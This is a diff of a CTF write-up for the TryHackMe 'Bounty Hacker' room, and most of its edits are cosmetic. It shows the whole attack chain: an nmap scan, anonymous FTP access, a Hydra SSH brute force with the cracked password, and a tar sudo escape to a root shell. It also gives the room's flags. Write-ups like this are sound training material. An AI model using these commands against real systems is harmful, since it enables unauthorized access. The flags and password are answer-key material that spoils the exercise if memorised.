@@ -11,9 +11,9 @@
 ## 📘 Overview
 
 The **Bounty Hacker** room places you in the role of a digital bounty hunter targeting a cybercriminal syndicate.  
-You’ll enumerate a server, access files via FTP, crack credentials, and escalate to root using a misconfigured sudo permission.
+You'll enumerate a server, access files via FTP, crack credentials, and escalate to root using a misconfigured sudo permission.
 
-> 🔎 A great beginner-friendly room covering foundational pentesting techniques like recon, password reuse, and privilege escalation.
+> 💡 A great beginner-friendly room covering foundational pentesting techniques like recon, password reuse, and privilege escalation.
 
 ---
 
@@ -28,11 +28,11 @@ nmap -sC -sV <target-ip>
 
 Ports Discovered:
 
-    21/tcp - FTP (vsftpd 3.0.3, anonymous login allowed)
+    21/tcp – FTP (vsftpd 3.0.3, anonymous login allowed)
 
-    22/tcp - SSH (OpenSSH 7.2.2)
+    22/tcp – SSH (OpenSSH 7.2.2)
 
-    80/tcp - HTTP (Apache httpd 2.4.18)
+    80/tcp – HTTP (Apache httpd 2.4.18)
 
 📂 FTP Access
 
@@ -48,22 +48,22 @@ task.txt
 ftp> get locks.txt
 ftp> get task.txt
 
-🧾 task.txt
+📄 task.txt
 
-1.) Protect Vicious.
-2.) Plan for Red Eye pickup on the moon.
+1.) Protect Vicious.  
+2.) Plan for Red Eye pickup on the moon.  
 -lin
 
-🧠 Username hint: lin
-🧾 locks.txt
+🔑 Username hint: lin
+📄 locks.txt
 
-Custom password list found — likely reused creds.
+Custom password list found — likely reused credentials.
 🔓 Gaining Access
-🚀 Brute Forcing with Hydra
+🚀 Brute Force with Hydra
 
 hydra -l lin -P locks.txt ssh://<target-ip>
 
-✅ Cracked password: RedDr4gonSynd1cat3
+✅ Password Found: RedDr4gonSynd1cat3
 🔐 SSH Access
 
 ssh lin@<target-ip>
@@ -81,10 +81,10 @@ THM{CR1M3_SyNd1C4T3}
 
 sudo -l
 
-User lin may run the following command on bountyhacker:
+User lin may run the following command as root:
 (root) /bin/tar
 
-🧨 Exploiting tar
+📦 Exploit Using tar
 
 sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 
@@ -101,21 +101,21 @@ THM{80UN7Y_h4cK3r}
 
 💡 Reflections
 
-    Anonymous FTP often opens the door to quick wins 🚪
+    📥 Anonymous FTP access is often overlooked but powerful
 
-    Password reuse is a goldmine for brute-force attacks 🔑
+    🔁 Password reuse is still a major weakness
 
-    sudo -l is your best friend — always check it 🛠️
+    🧪 Always run sudo -l — it's a goldmine
 
-    Simple tools like tar can be deadly in the wrong hands (or the right ones 😉)
+    🧰 Even basic tools like tar can grant root when misconfigured
 
 🧠 Pro Tip
 
     "When in doubt, poke around, read everything, and always try the simple stuff first."
 
-📁 Summary of Key Files
+🗂️ Summary of Key Files
 File	Description
-locks.txt	Password list for brute-force
-task.txt	Username clue and initial objectives
-user.txt	First flag on Rick's desktop
-root.txt	Final flag after privilege escalation
+locks.txt	Password list used in brute-force
+task.txt	Initial objective + username clue
+user.txt	First flag found on user's desktop
+root.txt	Root flag retrieved after escalation
